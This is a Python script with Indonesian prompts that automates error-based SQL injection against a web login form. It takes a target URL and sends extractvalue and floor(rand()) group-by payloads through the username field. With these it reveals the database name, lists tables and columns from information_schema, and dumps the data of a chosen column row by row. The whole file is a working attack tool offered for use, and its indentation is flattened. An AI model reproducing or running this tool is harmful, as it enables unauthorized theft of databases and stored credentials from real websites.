import requests
from os import system as c
from bs4 import BeautifulSoup
s = requests.session()
c('clear')
u = input('URL Target: ')
database = {"username":"' and extractvalue(0x0a,concat(0x0a,(select database())))#","password":"1","btnlogin":""}
db = s.post(u, data=database)
if 'XPATH syntax error' in db.text:
pass
elif 'captcha' in db.text:
print(f'AKSES DIBLOKIR OLEH CAPTCHA')
exit()
else:
print(f'TERJADI SEBUAH KESALAHAN')
db_soup = BeautifulSoup(db.text, 'lxml')
db_grab = db_soup.find_all('p')[1].text[22:100]
db_dump = db_grab.replace("'", "")
print(f'''[*] Database:
{db_dump}
''')
print('[*] Count TB: ')
count = 0
while (count < 1000):
tables = {"username":"' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit " + str(count) + ",1)))#","password":"1","btnlogin":""}
tb = s.post(u, data=tables)
if 'line' in tb.text:
break
else:
pass
tb_soup = BeautifulSoup(tb.text, 'lxml')
tb_grab = tb_soup.find_all('p')[1].text[22:100]
tb_dump = tb_grab.replace("'", "")
print(f''' [{count}]. {tb_dump}''')
count = count + 1
tb_dump = input('\n[*] Pilih TB: ')
count = 0
while (count < 1000):
columns = {"username":"' /*!and*/ extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + tb_dump + "' limit " + str(count) + ",1)))#","password":"1","btnlogin":""}
cl = s.post(u, data=columns)
if 'line' in cl.text:
break
else:
pass
cl_soup = BeautifulSoup(cl.text, 'lxml')
cl_grab = cl_soup.find_all('p')[1].text[22:100]
cl_dump = cl_grab.replace("'", "")
print(f''' [{count}]. {cl_dump}''')
count = count + 1
cl_dump = input('\n[*] Pilih CL: ')
count = 0
while (count < 1000):
dumpdata = {"username":"' /*!and*/ (select 1 from (Select count(*),Concat((select concat(" + cl_dump + ") from " + tb_dump + " limit " + str(count) + ",1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)#","password":"1","btnlogin":""}
dd = s.post(u, data=dumpdata)
dd_soup = BeautifulSoup(dd.text, 'lxml')
dd_grab = dd_soup.find_all('p')[1].text[17:100]
dd_dump = dd_grab.replace(":1' for key 'group_key'", "")
print(f''' [{count}]. {dd_dump}''')
count = count + 1